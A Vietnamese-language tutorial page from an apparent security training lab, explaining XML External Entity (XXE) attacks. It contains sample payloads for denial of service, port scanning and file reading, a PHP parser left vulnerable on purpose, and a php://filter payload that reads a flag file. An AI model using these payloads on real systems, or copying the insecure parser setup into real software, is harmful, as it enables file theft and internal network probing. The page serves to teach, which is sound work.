<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-xxe/xxe_tongquan" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    XML External Entities Attacks (XXE)
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                    <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="External-Entities-Attacks"><a href="#External-Entities-Attacks" class="headerlink" title="External Entities Attacks"></a>External Entities Attacks</h1>
                <p>XXE là một kĩ thuật tấn công vào quá trình XML Parser của các ngôn ngữ khi chuyển từ dữ liệu xml của người dùng sang dữ liệu đối tượng.</p>
                <p>Cuộc tấn công diễn ra khi đầu vào XML chưa tham chiếu đến một thực thể bên ngoài được xử lý do sự cấu hình yếu XML parser.<br>Cuộc tấn công XXE thành công có thể:</p>
                <ul>
                    <li>Tiết lộ dữ liệu bí mật như đọc file hệ thống, mã nguồn.</li>
                    <li>Denial of service (Tấn công từ chối dịch vụ)</li>
                    <li>Server side request forgery (SSRF)</li>
                    <li>Port scanning máy chạy XML parser và các hệ thống nội bộ.</li>
                </ul>
                <h2 id="External-Entity"><a href="#External-Entity" class="headerlink" title="External Entity"></a>External Entity</h2>
                <p>Cấu trúc của XML document được chia làm 2 phần:</p>
                <ul>
                    <li>Prolog (Header): Chứa các thông tin về phiên bản XML, bộ mã sử dụng và các khai báo định kiểu tài liệu kểu DTD để khai vào về cấu trúc và kiểu dữ liệu. Trong phần DTD này,ta <strong>có thể sử dụng các entity</strong> (giống như khai báo biến để sử dụng trong nội dung XML).</li>
                    <li>Document element: Nơi chứa các thẻ đánh dấu và nội dung chính của xml.</li>
                </ul>
                <p>External entity chính là điểm mấu chốt trong cuộc tấn công XXE.</p>
                <h3 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h3>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE author [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT author ANY&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY author "Doan Ngoc Vuong"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;author;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Trong ví dụ,ta có khai báo một ELEMENT author và ENITY author, khi XML document được sử lý, phần dữ liệu <strong>&amp;author</strong> sẽ được thay thế và tham chiếu đến <strong>“Doan Ngoc Vuong”</strong>. Và nội dung của nó bây giờ là <strong>Doan Ngoc Vuong</strong>.</p>
                <h2 id="Tai-sao-XXE-ton-tai"><a href="#Tai-sao-XXE-ton-tai" class="headerlink" title="Tại sao XXE tồn tại?"></a>Tại sao XXE tồn tại?</h2>
                <p>Bởi vì External Entity tồn tại. Nó có những chức năng và ta chỉ lợi dụng những chức năng đó để tấn công.<br>Đồng thời, đó là do cấu hình sai của nhà phát triển web, bởi vì thông thường, ta không thể khai báo và sử dụng XML Parser khi xml có chứa dữ liệu Entity.<br>Nó sẽ bỏ qua phần Entity hoặc bỏ qua luôn quá trình xử lý.</p>
                <h1 id="Cac-loai-XXE"><a href="#Cac-loai-XXE" class="headerlink" title="Các loại XXE"></a>Các loại XXE</h1>
                <h2 id="XXE-Denial-Of-Service"><a href="#XXE-Denial-Of-Service" class="headerlink" title="XXE: Denial Of Service"></a>XXE: Denial Of Service</h2>
                <p>Khi ta dùng cấu trúc xml, khai báo để cho trình xử lý XML Parser load một nội dung từ 1 file local lớn. Thì tài nguyên sẽ bị chiếm dụng rất nhiều.<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-</span></span></span><br><span class="line"><span class="php"><span class="number">1</span><span class="string">"?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sample SYSTEM "/var/very_big_file"&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="XXE-Local-Connect-Scan"><a href="#XXE-Local-Connect-Scan" class="headerlink" title="XXE: Local Connect Scan"></a>XXE: Local Connect Scan</h2>
                <p>Có thể dùng XXE để tạo một TCP port scans trong local.<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">*REQUEST</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sample PUBLIC "..." "http://localhost:99"&gt;</span></span><br><span class="line"></span><br><span class="line">*RESPONSE</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">type</span>&gt;</span>FATAL<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>XMLParserError: Error in building: Connection refused<span class="tag">&lt;/<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta có thể suy ra port 99 không được mở trong local.</p>
                <h2 id="XXE-DNS-Resolution"><a href="#XXE-DNS-Resolution" class="headerlink" title="XXE: DNS Resolution"></a>XXE: DNS Resolution</h2>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">* REQUEST</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sample PUBLIC "..." "http://www.csnc.ch:99"&gt;</span></span><br><span class="line"></span><br><span class="line">* RESPONSE</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span><span class="tag">&lt;<span class="name">type</span>&gt;</span>FATAL<span class="tag">&lt;/<span class="name">type</span>&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">XMLParserError: Error in building: Host not found:</span><br><span class="line">www.csnc.ch<span class="tag">&lt;/<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <h2 id="XXE-Global-Connect-Scan"><a href="#XXE-Global-Connect-Scan" class="headerlink" title="XXE: Global Connect Scan"></a>XXE: Global Connect Scan</h2>
                <p>Ta dùng để scan xem port nào được mở cho ra ngoài.<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">* REQUEST</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sample PUBLIC "..." "http://www.google.com"&gt;</span></span><br><span class="line"></span><br><span class="line">* RESPONSE</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span><span class="tag">&lt;<span class="name">type</span>&gt;</span>FATAL<span class="tag">&lt;/<span class="name">type</span>&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">XMLParserError: Error in building: Connection timeout</span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Port 80 ra ngoài đã bị chặn.</p>
                <h2 id="XXE-File-Inclusion"><a href="#XXE-File-Inclusion" class="headerlink" title="XXE: File Inclusion"></a>XXE: File Inclusion</h2>
                <p>Dùng để đọc file. Riêng phần này, mình sẽ trình bày rõ hơn trong ví dụ.</p>
                <h1 id="Tan-cong-XXE-basic"><a href="#Tan-cong-XXE-basic" class="headerlink" title="Tấn công XXE basic"></a>Tấn công XXE basic</h1>
                <p><strong>Thực hành phía bên trái</strong></p>
                <h2 id="Phan-tich-vi-du"><a href="#Phan-tich-vi-du" class="headerlink" title="Phân tích ví dụ."></a>Phân tích ví dụ.</h2>
                <p>Đoạn code xử lý việc XML Parser.<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">libxml_use_internal_errors(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>])){</span><br><span class="line">	$inject = base64_decode($_GET[<span class="string">'xml'</span>]);</span><br><span class="line">	$string = simplexml_load_string($inject, <span class="keyword">null</span>, LIBXML_NOENT);</span><br><span class="line">	print_r($string);</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta thấy, entity có thể dùng được vì dòng lệnh:</p>
                <blockquote>
                    <p>libxml_disable_entity_loader(false);</p>
                </blockquote>
                <p>Thông tin về hàm này ở đây: <a href="http://php.net/manual/en/function.simplexml-load-string.php" target="_blank" rel="noopener">http://php.net/manual/en/function.simplexml-load-string.php</a></p>
                <p>Mặc định của nó cũng là false luôn. Nên nếu ko bị set lên true thì ta vẫn có thể XXE nha.<br><strong>simplexml_load_string()</strong> là function hay được dùng để thực hiện parser xml trong PHP.</p>
                <p>Còn 1 tham số quan trọng là <strong>LUBXML_NOENT</strong> nó qui định sẽ thay thế biến trong xml với entity.<br><strong>Tìm hiểu thêm</strong>: <a href="http://php.net/manual/en/libxml.constants.php" target="_blank" rel="noopener">http://php.net/manual/en/libxml.constants.php</a></p>
                <h2 id="Xay-dung-payload"><a href="#Xay-dung-payload" class="headerlink" title="Xây dựng payload"></a>Xây dựng payload</h2>
                <p>Mục tiêu là đọc file flag.php nằm trong thư mục flag ở đường dẫn:</p>
                <blockquote>
                    <p>vul/xxe/flag/flag.php</p>
                </blockquote>
                <p>Payload sẽ có dạng thế này:<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE account [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=vul/xxe/flag/flag.php"&gt;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">account</span>&gt;</span>&amp;flag;<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Decode sang base64 rồi submit thử xem.</p>
                <h2 id="Thanh-cong"><a href="#Thanh-cong" class="headerlink" title="Thành công!"></a>Thành công!</h2>
                <h2 id="Tim-hieu-cac-payload-khac-o-day"><a href="#Tim-hieu-cac-payload-khac-o-day" class="headerlink" title="Tìm hiểu các payload khác ở đây:"></a>Tìm hiểu các payload khác ở đây:</h2>
                <ul>
                    <li><strong>Payload All The Thing XXE</strong>: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></li>
                </ul>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>